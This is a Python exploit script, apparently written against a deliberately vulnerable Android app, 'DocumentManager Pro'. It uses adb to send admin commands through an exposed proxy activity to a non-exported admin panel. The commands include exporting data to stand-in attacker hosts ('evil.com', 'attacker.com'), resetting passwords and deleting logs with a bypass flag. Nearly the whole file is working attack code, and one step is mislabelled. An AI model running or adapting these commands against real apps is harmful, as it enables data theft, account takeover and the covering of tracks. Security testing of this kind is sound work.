#!/usr/bin/env python3
"""
Test script to demonstrate the Direct Proxy Activity Exploitation vulnerability
in DocumentManager Pro (ben74).

This script uses ADB to launch an exploit that bypasses Android's export restrictions
by using a proxy activity to access non-exported components.
"""

import subprocess
import sys

def run_adb_command(cmd):
    """Run an ADB command and return the output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip(), result.returncode
    except Exception as e:
        return "", str(e), 1

def test_direct_access():
    """Test direct access to the non-exported AdminPanelActivity (should fail)."""
    print("🔒 Testing direct access to AdminPanelActivity...")
    cmd = 'adb shell am start -n com.documentmanager/.AdminPanelActivity --es admin_command "export_data"'
    stdout, stderr, code = run_adb_command(cmd)
    
    if "SecurityException" in stderr or "Permission Denial" in stderr or code != 0:
        print("✅ Direct access correctly blocked by Android security")
        print(f"   Error: {stderr}")
        return True
    else:
        print("❌ Unexpected: Direct access succeeded")
        return False

def exploit_via_proxy():
    """Exploit the vulnerability using the proxy activity."""
    print("\n🎯 Launching exploit via IntentProcessorActivity...")
    
    # Create a proper embedded intent attack
    print("📋 Creating embedded intent targeting AdminPanelActivity...")
    
    # Method 1: Direct approach using admin command extras
    print("🚨 Launching embedded intent attack...")
    cmd = 'adb shell am start -n com.documentmanager/.IntentProcessorActivity --es admin_command "export_data" --es admin_target "evil.com"'
    print(f"Running: {cmd}")
    stdout, stderr, code = run_adb_command(cmd)
    
    if code == 0:
        print("✅ Proxy activity launched with admin command!")
        
        # Method 2: Try alternative approach
        print("\n🔍 Testing alternative embedded intent approach...")
        cmd2 = 'adb shell am start -n com.documentmanager/.IntentProcessorActivity --es admin_command "reset_passwords" --es admin_target "attacker.com"'
        
        stdout2, stderr2, code2 = run_adb_command(cmd2)
        
        if code2 == 0:
            print("✅ Alternative embedded intent attack launched!")
        
        # Method 3: Test data export command
        print("\n🎯 Testing data export command...")
        cmd3 = 'adb shell am start -n com.documentmanager/.IntentProcessorActivity --es admin_command "delete_logs" --ez force_bypass true'
        
        stdout3, stderr3, code3 = run_adb_command(cmd3)
        
        if code3 == 0:
            print("✅ Data export command injected!")
            
        return True
    else:
        print(f"❌ Proxy activity launch failed: {stderr}")
        return False

def check_app_installed():
    """Check if DocumentManager Pro is installed."""
    print("📱 Checking if DocumentManager Pro is installed...")
    cmd = 'adb shell pm list packages | grep com.documentmanager'
    stdout, stderr, code = run_adb_command(cmd)
    
    if "com.documentmanager" in stdout:
        print("✅ DocumentManager Pro is installed")
        return True
    else:
        print("❌ DocumentManager Pro not found. Please install the APK first.")
        return False

def main():
    if not check_app_installed():
        return
    if not test_direct_access():
        print("⚠️  Warning: Direct access should be blocked")
    if exploit_via_proxy():
        print("\n🎉 Vulnerability exploitation attempted!")
        print("Check device logs for AdminPanelActivity access:")
        print("adb logcat | grep -i 'adminpanel\\|documentprocessor'")
    else:
        print("\n❌ Exploit attempt failed")

if __name__ == "__main__":
    main()
